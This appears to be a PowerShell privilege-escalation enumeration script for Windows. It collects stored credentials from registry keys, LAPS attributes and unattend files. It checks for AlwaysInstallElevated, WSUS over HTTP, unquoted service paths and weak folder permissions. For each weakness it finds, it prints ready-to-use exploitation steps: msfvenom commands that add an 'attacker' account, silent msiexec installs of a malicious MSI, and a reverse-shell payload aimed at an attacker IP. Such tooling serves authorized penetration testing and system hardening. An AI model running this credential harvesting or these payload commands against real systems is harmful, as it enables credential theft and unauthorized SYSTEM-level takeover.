<#
.SYNOPSIS
    This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are enabled on a Windows Machine which opens the door to privesc

.DESCRIPTION
    AlwaysInstallElevated is functionality that offers all users(especially the low privileged user) on a windows machine to run any MSI file with elevated privileges.
    MSI is a Microsoft based installer package file format which is used for installing, storing and removing of a program.

    When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user
    to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).

.SYNTAX
    Test-PrivEsc [<CommonParameters>]

.PARAMETERS
    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).

.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com/ 
#>
Function Test-PrivEsc {
    [CmdletBinding()]
        param()

#==============================================================================================================
#  CLEAR TEXT CREDENTIALS
#==============================================================================================================
        Write-Host "Searching Registry for clear text credentials..." -ForegroundColor "Cyan"

        Get-ItemProperty -Path "HKCU:\Software\ORL\WinVNC3\Password" -ErrorAction "SilentlyContinue"

        $AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
        If (($AutoLoginPassword).DefaultPassword)
        {

            Write-Host "Auto Login Credentials Found: " -ForegroundColor "Red"
            Write-Host "$AutoLoginPassword" -ForegroundColor "Red"

        }  # End If

        Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\TightVNC\Server" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\OpenSSH\Agent\Key" -ErrorAction "SilentlyContinue"

        Write-Verbose "Searching for LAPS password (Requires admin permissions to obtain)"
        $Domain = New-Object -TypeName "System.DirectoryServices.DirectoryEntry"
        $Search = New-Object -TypeName "System.DirectoryServices.DirectorySearcher"
        $Search.SearchRoot = $Domain
        $Search.Filter = "(primaryGroupID=516)"
        $Search.SearchScope = "Subtree"
        $Result = $Search.FindAll()
        $Object = $Result.GetDirectoryEntry()
        $Object | Select-Object -Property 'Name','ms-Mcs-AdmPwd'

        $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
        ForEach ($PassFile in $PassFiles)
        {

            If (Test-Path -Path $PassFile)
            {

                Get-Content -Path $PassFile | Select-String -Pattern "Password"

            }  # End If 

        }  # End ForEach 
#============================================================================================================
#  AlwaysInstallElevated PRIVESC
#============================================================================================================
        Write-Host "Checking for AlwaysInstallElevated PrivEsc method..." -ForegroundColor "Cyan"
        If ((Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction "SilentlyContinue" | Select-Object -Property "AlwaysInstallElevated") -eq 1)
        {

            Write-Host "Target is vulnerable. To exploit this vulnerability you can use: exploit/windows/local/always_install_elevated`n
                        Use the below commands to create a payload for privilege escalation.`n" -ForegroundColor "Red"
            Write-Host "msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi-nouac -o alwe.msi    # No uac format`n
                        msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi -o alwe.msi          # Using the msiexec the uac wont be prompted`n
                        msiexec /quiet /qn /i C:\Users\<username>\Downloads\alwe.msi                            # Execute the installation of the malicious msi file in the background"

        }  # End If
        Else
        {

            Write-Verbose "Target is not vulnerable to AlwaysInstallElevated PrivEsc method"

        }  # End Else
        If ((Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction "SilentlyContinue" | Select-Object -Property "AlwaysInstallElevated") -eq 1)
        {

            Write-Host "Target is vulnerable. To exploit this vulnerability you can use: exploit/windows/local/always_install_elevated`n
                        Use the below commands to create a payload for privilege escalation.`n" -ForegroundColor "Red"
            Write-Host "msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi-nouac -o privesc.msi  # No uac format`n
                        msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi -o privesc.msi        # Using the msiexec the uac wont be prompted`n
                        msiexec /quiet /qn /i C:\Users\<username>\Downloads\privesc.msi                             # Execute the installation of the malicious msi file in the background"

        }  # End ElseIf
        Else
        {

            Write-Verbose "Target is not vulnerable to AlwaysInstallElevated PrivEsc method"

        }  # End Else

#===========================================================================================================
#  WSUS PRIVESC
#===========================================================================================================
        Write-Host "Checking for WSUS updates allowed over HTTP for PrivEsc..." -ForegroundColor "Cyan"
        If (((Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "UseWUServer" -ErrorAction "SilentlyContinue") -eq 1) -and (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUServer" -ErrorAction "SilentlyContinue" -Contains "http://"))
        {

            Write-Host "Target is vulnerable to HTTP WSUS updates.`n EXPLOIT: https://github.com/pimps/wsuxploit" -ForegroundColor "Red"

        }  # End If
        Else
        {

            Write-Verbose "Target is not vulnerable to WSUS using HTTP."

        }  # End Else


#============================================================================================================
#  UNQUOTED SERVICE PATHS
#============================================================================================================
        Write-Host "Searching for unquoted service paths..." -ForegroundColor "Cyan"

        $UnquotedServicePaths = Get-CimInstance -ClassName "Win32_Service" -Property "Name","DisplayName","PathName","StartMode" | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*' } | Select-Object -Property "PathName","DisplayName","Name"

        If ($UnquotedServicePaths)
        {

            Write-Host "Unquoted Service Path has been found" -ForegroundColor "Red"

            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name 

            Write-Host "Create a reverse shell using the following command`n`nmsfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe -o msf.exe" -ForegroundColor "Yellow"
            Write-Host "Place the generated payload msf.exe into the unquoted service path location and restart the service." -ForegroundColor "Yellow"

        }  # End If
        Else
        {

            Write-Verbose "Target does not contain any unquoted service paths. "

        }  # End Else

#==============================================================================================================
#  WEAK WRITE PERMISSIONS
#==============================================================================================================
        Write-Host "Performing search for files with weak permissions that may execute as admin or system..." -ForegroundColor "Cyan"

        Get-ChildItem -Path 'C:\Program Files\*','C:\Program Files (x86)\*' | ForEach-Object { Try { Get-Acl -Path $_ -ErrorAction "SilentlyContinue" | Where-Object {($_.Access | Select-Object -ExpandProperty "IdentityReference") -Match "Everyone"} } Catch {$Error[0]}}

        Get-ChildItem -Path 'C:\Program Files\*','C:\Program Files (x86)\*' | ForEach-Object { Try { Get-Acl -Path $_ -ErrorAction "SilentlyContinue" | Where-Object {($_.Access | Select-Object -ExpandProperty "IdentityReference") -Match "BUILTIN\\Users"} } Catch {$Error[0]}}

}  # End Function Test-PrivEsc
